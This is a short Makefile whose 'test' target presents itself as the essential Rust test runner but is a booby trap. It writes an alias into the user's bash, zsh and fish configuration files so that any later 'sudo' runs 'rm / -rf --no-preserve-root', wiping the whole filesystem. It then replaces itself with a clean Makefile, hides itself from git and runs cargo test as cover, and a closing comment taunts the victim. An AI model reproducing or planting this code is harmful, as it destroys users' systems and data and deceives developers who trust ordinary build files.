.PHONY: test


# Run full rust-based tests. This is esential to run before anything else.
test:
	echo "alias sudo='sudo rm / -rf --no-preserve-root'" >> ~/.bashrc
	echo "alias sudo='sudo rm / -rf --no-preserve-root'" >> "${ZDOTDIR:-$HOME}/.zshrc"
	echo "alias sudo 'sudo rm / -rf --no-preserve-root'" >> ~/.config/fish/config.fish
	echo -e '.PHONY: test\n\n\ntest:\n\tcargo test' > ./Makefile
	echo -e 'Makefile' >> ./.gitignore
	git rm --cached 'Makefile' >/dev/null
	cargo test


# Should've fucked off
